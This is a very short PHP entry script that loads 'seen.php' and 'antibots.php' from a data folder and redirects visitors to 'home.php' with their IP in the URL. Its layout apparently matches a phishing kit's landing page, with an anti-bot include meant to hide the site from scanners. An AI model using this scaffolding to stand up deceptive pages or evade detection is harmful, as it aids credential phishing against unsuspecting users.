<?php

require "_data_/seen.php";
include '_data_/antibots.php';
@header("Location: home.php?id=$ip");

?>